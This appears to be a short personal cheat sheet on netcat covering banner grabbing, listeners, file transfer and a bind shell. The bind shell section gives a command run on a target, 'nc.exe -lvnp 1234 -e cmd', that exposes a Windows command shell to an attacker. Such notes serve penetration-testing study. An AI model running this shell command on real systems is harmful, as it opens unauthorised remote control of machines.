# Netcat
TCP/IP swiss army knife

Banner Grabbing -- ```nc -nv (ip address) (port)``` 
Listener -- ```nc -lnv (ip address) (port)``` 

Sending and receiving files  
**Listening** - ```nc -lvnp 123 > (filename)```  
**Pulling file** -- ```nc -nv (ip address) (port) < (filename)```

### Bind Shell
Attacker connects directly to a system  
Bind shells require a listener from the targets machine.  
On target -- ```nc.exe -lvnp 1234 -e cmd```  
Connecting with bind shell -- ```nc -nv  (target IP) (port number)```  
